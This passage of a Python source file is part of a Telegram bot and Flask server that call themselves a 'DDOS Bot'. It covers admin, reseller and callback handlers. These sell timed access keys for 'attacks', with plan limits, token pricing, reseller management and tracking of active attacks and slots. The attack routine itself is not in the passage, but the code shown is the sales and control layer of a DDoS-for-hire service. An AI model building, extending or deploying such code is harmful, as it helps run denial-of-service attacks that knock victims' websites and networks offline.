        await update.message.reply_text("❌ Plan must be 'basic' or 'premium'!")
        return
    
    days, hours = 0, 0
    if duration.endswith('d'):
        days = int(duration[:-1])
    elif duration.endswith('h'):
        hours = int(duration[:-1])
    else:
        await update.message.reply_text("❌ Use 'd' or 'h'! (e.g., 30d, 12h)")
        return
    
    plan_settings = PLAN_SETTINGS.get(plan, PLAN_SETTINGS['basic'])
    
    generated_keys = generate_admin_keys(prefix, days, hours, plan, count)
    
    keys_display = "\n".join([f"🎫 {k}" for k in generated_keys])
    
    duration_text = f"{days}d ({days*24} Hours)" if days > 0 else f"{hours}h ({hours} Hours)"
    
    msg = f"""
🔑 {count} New Keys Generated
━━━━━━━━━━━━━━━━━━━━━━
⏳ Duration: {duration_text}
📀 Plan: {plan_settings['label']}
👤 By: Admin
━━━━━━━━━━━━━━━━━━━━━━
📋 Keys:
{keys_display}
━━━━━━━━━━━━━━━━━━━━━━
👑 Owner: @TG_DEVILOP
"""
    
    await update.message.reply_text(msg)

async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if not keys:
        await update.message.reply_text("No keys!")
        return
    
    unused, used, blocked = [], [], []
    for k, v in keys.items():
        dur = f"{v['days']}d" if v['days'] > 0 else f"{v['hours']}h"
        plan = v.get('plan', 'basic').upper()
        if is_key_blocked(k):
            blocked.append(f"🔑 {k} - {dur} - {plan} - BLOCKED")
        elif v.get('used', False):
            used.append(f"🔑 {k} - {dur} - {plan} - Used")
        else:
            unused.append(f"🔑 {k} - {dur} - {plan} - Available")
    
    msg = "📋 KEYS LIST\n\n"
    if unused:
        msg += "✅ UNUSED:\n" + "\n".join(unused[:15]) + "\n\n"
    if used:
        msg += "❌ USED:\n" + "\n".join(used[:15]) + "\n\n"
    if blocked:
        msg += "🚫 BLOCKED:\n" + "\n".join(blocked[:15])
    
    await update.message.reply_text(msg[:4000])

async def deletekeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    keyboard = [
        [InlineKeyboardButton("🗑️ DELETE ALL UNUSED KEYS", callback_data='admin_del_unused')],
        [InlineKeyboardButton("🗑️ DELETE ALL USED KEYS", callback_data='admin_del_used')],
        [InlineKeyboardButton("🗑️ DELETE ALL KEYS", callback_data='admin_del_all')],
        [InlineKeyboardButton("❌ CANCEL", callback_data='admin_del_cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🗑️ ADMIN - DELETE KEYS", reply_markup=reply_markup)

async def addreseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 2:
        await update.message.reply_text("Usage: /addreseller ID TOKENS")
        return
    
    add_reseller(int(args[0]), int(args[1]), False)
    await update.message.reply_text(f"✅ Reseller {args[0]} added with {args[1]} tokens!")

async def removereseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /removereseller ID")
        return
    
    remove_reseller(args[0])
    await update.message.reply_text("✅ Reseller removed!")

async def resellers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if not resellers:
        await update.message.reply_text("No resellers!")
        return
    
    msg = "💼 RESELLERS LIST\n\n"
    for rid, data in resellers.items():
        tokens = "∞" if data.get('unlimited', False) else data.get('tokens', 0)
        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data.get('total_earned', 0)}\n━━━━━━━━━━━━━━━━\n"
    
    await update.message.reply_text(msg[:4000])

async def blockkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /blockkey KEY")
        return
    
    key = args[0].upper()
    if key not in keys:
        await update.message.reply_text("❌ Key not found!")
        return
    
    if is_key_blocked(key):
        await update.message.reply_text("❌ Key already blocked!")
        return
    
    creator = keys[key].get('created_by', 'unknown')
    add_blocked_key(creator, key, "blocked_by_admin")
    await update.message.reply_text(f"✅ Key {key} blocked!")

async def unblockkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /unblockkey KEY")
        return
    
    key = args[0].upper()
    if not is_key_blocked(key):
        await update.message.reply_text("❌ Key not blocked!")
        return
    
    remove_blocked_key(key)
    await update.message.reply_text(f"✅ Key {key} unblocked!")

async def lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_locked
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    is_locked = True
    settings['is_locked'] = is_locked
    save_json(SETTINGS_FILE, settings)
    await update.message.reply_text("🔒 Bot locked!")

async def unlock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_locked
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    is_locked = False
    settings['is_locked'] = is_locked
    save_json(SETTINGS_FILE, settings)
    await update.message.reply_text("🔓 Bot unlocked!")

async def unlimited(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /unlimited ID")
        return
    
    rid = str(args[0])
    if rid not in resellers:
        await update.message.reply_text("❌ Reseller not found!")
        return
    
    resellers[rid]['unlimited'] = True
    save_json(RESELLERS_FILE, resellers)
    await update.message.reply_text(f"✅ Reseller {rid} is now unlimited!")

async def limited(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Command not found!")
        return
    
    if len(args) != 2:
        await update.message.reply_text("Usage: /limited ID TOKENS")
        return
    
    rid = str(args[0])
    tokens = int(args[1])
    
    if rid not in resellers:
        await update.message.reply_text("❌ Reseller not found!")
        return
    
    resellers[rid]['unlimited'] = False
    resellers[rid]['tokens'] = tokens
    save_json(RESELLERS_FILE, resellers)
    await update.message.reply_text(f"✅ Reseller {rid} is now limited to {tokens} tokens!")

# ======================== RESELLER COMMANDS ============================

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if not is_reseller(user_id):
        await update.message.reply_text("❌ Only for resellers!")
        return
    
    tokens = get_reseller_tokens(user_id)
    keyboard = [
        [InlineKeyboardButton("📀 BASIC PLAN", callback_data='select_basic')],
        [InlineKeyboardButton("🌟 PREMIUM PLAN", callback_data='select_premium')],
        [InlineKeyboardButton("❌ CANCEL", callback_data='genkey_cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"💼 SELECT PLAN TYPE\n\n"
        f"💰 Balance: {tokens}\n\n"
        f"📀 BASIC - 300s Max Time, 60s Cooldown\n"
        f"🌟 PREMIUM - 600s Max Time, 0s Cooldown\n\n"
        f"Select a plan to continue:",
        reply_markup=reply_markup
    )

async def deletekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if not is_reseller(user_id):
        await update.message.reply_text("❌ Only for resellers!")
        return
    
    keys_list = get_reseller_keys(user_id)
    if not keys_list:
        await update.message.reply_text("❌ No keys to delete!")
        return
    
    keyboard = []
    for k in keys_list[:20]:
        keyboard.append([InlineKeyboardButton(f"🔑 {k}", callback_data=f'delkey_{k}')])
    keyboard.append([InlineKeyboardButton("❌ CANCEL", callback_data='delkey_cancel')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🗑️ SELECT KEY TO DELETE", reply_markup=reply_markup)

async def blockkey_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    args = context.args
    
    if not is_reseller(user_id):
        await update.message.reply_text("❌ Only for resellers!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /blockkey KEY")
        return
    
    key = args[0].upper()
    if key not in keys:
        await update.message.reply_text("❌ Key not found!")
        return
    
    if keys[key].get('created_by') != user_id:
        await update.message.reply_text("❌ You can only block keys you generated!")
        return
    
    if is_key_blocked(key):
        await update.message.reply_text("❌ Key already blocked!")
        return
    
    add_blocked_key(user_id, key, "blocked_by_reseller")
    await update.message.reply_text(f"✅ Key {key} blocked!")

async def unblockkey_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    args = context.args
    
    if not is_reseller(user_id):
        await update.message.reply_text("❌ Only for resellers!")
        return
    
    if len(args) != 1:
        await update.message.reply_text("Usage: /unblockkey KEY")
        return
    
    key = args[0].upper()
    if not is_key_blocked(key):
        await update.message.reply_text("❌ Key not blocked!")
        return
    
    if blocked_keys[key].get('created_by') != user_id:
        await update.message.reply_text("❌ You can only unblock keys you blocked!")
        return
    
    remove_blocked_key(key)
    await update.message.reply_text(f"✅ Key {key} unblocked!")

async def myblockedkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if not is_reseller(user_id):
        await update.message.reply_text("❌ Only for resellers!")
        return
    
    blocked = get_reseller_blocked_keys(user_id)
    if not blocked:
        await update.message.reply_text("❌ No blocked keys!")
        return
    
    msg = "🚫 YOUR BLOCKED KEYS\n━━━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join([f"🔑 {k}" for k in blocked])
    await update.message.reply_text(msg)

# ======================== CALLBACK HANDLERS ============================

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    data = query.data
    
    # Plan selection
    if data == "select_basic":
        plan = "basic"
        plan_settings = PLAN_SETTINGS['basic']
        keyboard = [
            [InlineKeyboardButton("🕐 1 HOUR (1 token)", callback_data=f'genkey_{plan}_1h')],
            [InlineKeyboardButton("🕐 12 HOURS (2 tokens)", callback_data=f'genkey_{plan}_12h')],
            [InlineKeyboardButton("📅 1 DAY (4 tokens)", callback_data=f'genkey_{plan}_1d')],
            [InlineKeyboardButton("📅 3 DAYS (8 tokens)", callback_data=f'genkey_{plan}_3d')],
            [InlineKeyboardButton("📅 7 DAYS (15 tokens)", callback_data=f'genkey_{plan}_7d')],
            [InlineKeyboardButton("📅 14 DAYS (30 tokens)", callback_data=f'genkey_{plan}_14d')],
            [InlineKeyboardButton("📅 30 DAYS (50 tokens)", callback_data=f'genkey_{plan}_30d')],
            [InlineKeyboardButton("🔙 BACK", callback_data='genkey_back')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='genkey_cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"📀 BASIC PLAN SELECTED\n\n"
            f"⚡ Max Time: 300s\n"
            f"❄️ Cooldown: 60s\n"
            f"🎯 Unlimited Attacks\n"
            f"🔑 Prefix: {plan_settings['prefix']}\n\n"
            f"Select duration:",
            reply_markup=reply_markup
        )
    
    elif data == "select_premium":
        plan = "premium"
        plan_settings = PLAN_SETTINGS['premium']
        keyboard = [
            [InlineKeyboardButton("🕐 1 HOUR (2 tokens)", callback_data=f'genkey_{plan}_1h')],
            [InlineKeyboardButton("🕐 12 HOURS (4 tokens)", callback_data=f'genkey_{plan}_12h')],
            [InlineKeyboardButton("📅 1 DAY (8 tokens)", callback_data=f'genkey_{plan}_1d')],
            [InlineKeyboardButton("📅 3 DAYS (16 tokens)", callback_data=f'genkey_{plan}_3d')],
            [InlineKeyboardButton("📅 7 DAYS (30 tokens)", callback_data=f'genkey_{plan}_7d')],
            [InlineKeyboardButton("📅 14 DAYS (60 tokens)", callback_data=f'genkey_{plan}_14d')],
            [InlineKeyboardButton("📅 30 DAYS (100 tokens)", callback_data=f'genkey_{plan}_30d')],
            [InlineKeyboardButton("🔙 BACK", callback_data='genkey_back')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='genkey_cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"🌟 PREMIUM PLAN SELECTED\n\n"
            f"⚡ Max Time: 600s\n"
            f"❄️ Cooldown: 0s\n"
            f"🎯 Unlimited Attacks\n"
            f"🔑 Prefix: {plan_settings['prefix']}\n\n"
            f"Select duration:",
            reply_markup=reply_markup
        )
    
    elif data == "genkey_back":
        tokens = get_reseller_tokens(user_id)
        keyboard = [
            [InlineKeyboardButton("📀 BASIC PLAN", callback_data='select_basic')],
            [InlineKeyboardButton("🌟 PREMIUM PLAN", callback_data='select_premium')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='genkey_cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"💼 SELECT PLAN TYPE\n\n"
            f"💰 Balance: {tokens}\n\n"
            f"📀 BASIC - 300s Max Time, 60s Cooldown\n"
            f"🌟 PREMIUM - 600s Max Time, 0s Cooldown\n\n"
            f"Select a plan to continue:",
            reply_markup=reply_markup
        )
    
    elif data == "genkey_cancel":
        await query.edit_message_text("❌ Cancelled!")
    
    elif data.startswith("genkey_"):
        parts = data.replace("genkey_", "").split("_")
        if len(parts) == 2:
            plan = parts[0]
            duration = parts[1]
        else:
            duration = parts[0]
            plan = 'basic'
        
        if duration == "cancel" or duration == "back":
            return
        
        price = KEY_PRICES.get(duration, {}).get(plan, 0)
        plan_settings = PLAN_SETTINGS.get(plan, PLAN_SETTINGS['basic'])
        keyboard = [
            [InlineKeyboardButton("✅ YES, GENERATE KEY", callback_data=f'confirm_{plan}_{duration}')],
            [InlineKeyboardButton("❌ NO, CANCEL", callback_data='confirm_cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"⚠️ CONFIRM KEY GENERATION\n\n"
            f"📀 Plan: {plan_settings['label']}\n"
            f"⏳ Duration: {duration}\n"
            f"💰 Cost: {price} tokens\n"
            f"🔑 Prefix: {plan_settings['prefix']}\n\n"
            f"Are you sure you want to generate this key?",
            reply_markup=reply_markup
        )
    
    elif data.startswith("confirm_"):
        parts = data.replace("confirm_", "").split("_")
        if len(parts) == 2:
            plan = parts[0]
            duration = parts[1]
        else:
            duration = parts[0]
            plan = 'basic'
        
        if duration == "cancel":
            await query.edit_message_text("❌ Key generation cancelled!")
            return
        
        key, error = generate_reseller_key(user_id, duration, plan)
        if error:
            await query.edit_message_text(error)
        else:
            price = KEY_PRICES.get(duration, {}).get(plan, 0)
            plan_settings = PLAN_SETTINGS.get(plan, PLAN_SETTINGS['basic'])
            await query.edit_message_text(
                f"✅ KEY GENERATED SUCCESSFULLY!\n\n"
                f"🔑 Key: `{key}`\n"
                f"📀 Plan: {plan_settings['label']}\n"
                f"⏳ Duration: {duration}\n"
                f"💰 Tokens Used: {price}",
                parse_mode='Markdown'
            )
    
    elif data.startswith("delkey_"):
        key = data.replace("delkey_", "")
        if key == "cancel":
            await query.edit_message_text("❌ Cancelled!")
            return
        
        if delete_key(key):
            for rid, rdata in resellers.items():
                if key in rdata.get('keys_generated', []):
                    rdata['keys_generated'].remove(key)
                    save_json(RESELLERS_FILE, resellers)
                    break
            
            await query.edit_message_text(f"✅ Key deleted: {key}")
        else:
            await query.edit_message_text("❌ Key not found!")
    
    elif data.startswith("admin_del_"):
        count = 0
        if data == "admin_del_unused":
            for k, v in list(keys.items()):
                if not v.get('used', False) and not is_key_blocked(k):
                    del keys[k]
                    count += 1
            save_json(KEYS_FILE, keys)
            await query.edit_message_text(f"✅ Deleted {count} unused keys!")
        elif data == "admin_del_used":
            for k, v in list(keys.items()):
                if v.get('used', False):
                    del keys[k]
                    count += 1
            save_json(KEYS_FILE, keys)
            await query.edit_message_text(f"✅ Deleted {count} used keys!")
        elif data == "admin_del_all":
            keys.clear()
            for rid in resellers:
                if 'keys_generated' in resellers[rid]:
                    resellers[rid]['keys_generated'] = []
            save_json(KEYS_FILE, keys)
            save_json(RESELLERS_FILE, resellers)
            await query.edit_message_text("✅ Deleted all keys!")
        elif data == "admin_del_cancel":
            await query.edit_message_text("❌ Cancelled!")

# ======================== FLASK ROUTES ============================

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "bot": "DDOS Bot",
        "active_attacks": len(active_attacks),
        "max_slots": MAX_SLOTS,
        "total_keys": len(keys),
        "total_users": len(users),
        "total_resellers": len(resellers)
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

@app.route('/auto_complete', methods=['POST'])
def auto_complete():
    try:
        current_time = time.time()
        for attack_id, attack in list(active_attacks.items()):
            elapsed = current_time - attack['start_time']
            if elapsed >= attack['duration']:
                # Attack completed
                print(f"✅ Attack completed: {attack_id}")
                del active_attacks[attack_id]
        
        return jsonify({"success": True, "message": "Auto complete ran"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ======================== TELEGRAM BOT SETUP ============================

def run_telegram():
    """Run Telegram bot in a separate thread"""
    print("🤖 Starting Telegram Bot...")
    
    bot_app = Application.builder().token(BOT_TOKEN).build()
    
    # Add all handlers
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("attack", attack))
    bot_app.add_handler(CommandHandler("status", status))
    bot_app.add_handler(CommandHandler("ping", ping))
    bot_app.add_handler(CommandHandler("id", id_command))
    bot_app.add_handler(CommandHandler("redeem", redeem))
    bot_app.add_handler(CommandHandler("check_my_access", check_my_access))
    bot_app.add_handler(CommandHandler("help", help_command))
    
    # Admin stop command
    bot_app.add_handler(CommandHandler("stop", stop))
    
    # Admin commands
    bot_app.add_handler(CommandHandler("adduser", adduser))
    bot_app.add_handler(CommandHandler("removeuser", removeuser))
    bot_app.add_handler(CommandHandler("addgroup", addgroup))
    bot_app.add_handler(CommandHandler("removegroup", removegroup))
    bot_app.add_handler(CommandHandler("setthreads", setthreads))
    bot_app.add_handler(CommandHandler("settime", settime))
    bot_app.add_handler(CommandHandler("setslots", setslots))
    bot_app.add_handler(CommandHandler("setcooldown", setcooldown))
    bot_app.add_handler(CommandHandler("setdaily", setdaily))
    bot_app.add_handler(CommandHandler("gen", gen))
    bot_app.add_handler(CommandHandler("keys", keys_command))
    bot_app.add_handler(CommandHandler("deletekeys", deletekeys))
    bot_app.add_handler(CommandHandler("addreseller", addreseller))
    bot_app.add_handler(CommandHandler("removereseller", removereseller))
    bot_app.add_handler(CommandHandler("resellers", resellers_command))
    bot_app.add_handler(CommandHandler("blockkey", blockkey))
    bot_app.add_handler(CommandHandler("unblockkey", unblockkey))
    bot_app.add_handler(CommandHandler("lock", lock))
    bot_app.add_handler(CommandHandler("unlock", unlock))
    bot_app.add_handler(CommandHandler("unlimited", unlimited))
    bot_app.add_handler(CommandHandler("limited", limited))
    
    # Reseller commands
    bot_app.add_handler(CommandHandler("genkey", genkey))
    bot_app.add_handler(CommandHandler("deletekey", deletekey))
    bot_app.add_handler(CommandHandler("blockkey", blockkey_reseller))
    bot_app.add_handler(CommandHandler("unblockkey", unblockkey_reseller))
    bot_app.add_handler(CommandHandler("myblockedkeys", myblockedkeys))
    
    # Callback handler
    bot_app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("⚡ Telegram Bot Started Successfully!")
    bot_app.run_polling()

# ======================== MAIN ============================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    
    # Start Telegram bot in background thread
    bot_thread = threading.Thread(target=run_telegram, daemon=True)
    bot_thread.start()
    
    print("="*60)
    print("🔥 DDOS BOT - FULL SYSTEM")
    print("="*60)
    print(f"📡 Flask Server: http://0.0.0.0:{port}")
    print(f"🤖 Telegram Bot: Active")
    print(f"🔑 Total Keys: {len(keys)}")
    print(f"📌 Max Slots: {MAX_SLOTS}")
    print("="*60)
    
    # Run Flask app
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)